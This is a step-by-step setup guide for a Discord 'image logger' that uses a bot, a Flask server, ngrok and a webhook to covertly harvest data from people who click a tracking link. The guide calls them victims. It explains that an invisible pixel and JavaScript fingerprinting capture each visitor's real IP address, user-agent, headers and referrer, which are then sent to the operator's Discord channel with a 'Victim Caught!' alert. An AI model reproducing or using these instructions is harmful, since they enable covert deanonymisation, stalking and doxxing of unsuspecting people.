# 1. Create Discord Bot

1. Go to https://discord.com/developers/applications
2. "New Application" → Name it "Image Bot"
3. Bot tab → "Add Bot" → Copy TOKEN
4. Enable "Message Content Intent" (Privileged)
5. OAuth2 → URL Generator → bot + Send Messages → Invite to server

# 2. Create Discord Webhook

Server → Channel → Edit → Integrations → Webhooks → New Webhook
Copy Webhook URL

# 3. Install & Run Logger Server

pip install flask requests pillow
python logger_server.py
# Server runs on http://localhost:5000


# 4. Public URL with ngrok

pip install pyngrok
ngrok http 5000
# Copy https://abc123.ngrok.io → This is your TRACKING_DOMAIN

# 5. Configure Bot

Edit these 3 lines in img_logger.py:
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE"
TRACKING_DOMAIN = "https://abc123.ngrok.io/"

# 6. Run Bot

pip install discord.py aiohttp pillow
python img_logger.py


# What Happens When Victim Clicks

1. Visits your tracking URL
2. Browser sends IP + User-Agent + Headers
3. 1x1 invisible pixel tracks page load
4. JavaScript sends extra fingerprint
5. Discord webhook gets live embed:
🎣 Victim Caught! IP: 123.45.67.89 UA: Chrome...

# Logs You Get

✅ Real IP Address
✅ Full User-Agent
✅ Browser Headers
✅ Timestamp
✅ Unique Track ID
✅ Referrer URL
✅ JS Fingerprint


# Stop & Clean

Ctrl+C both terminals
Bot goes offline
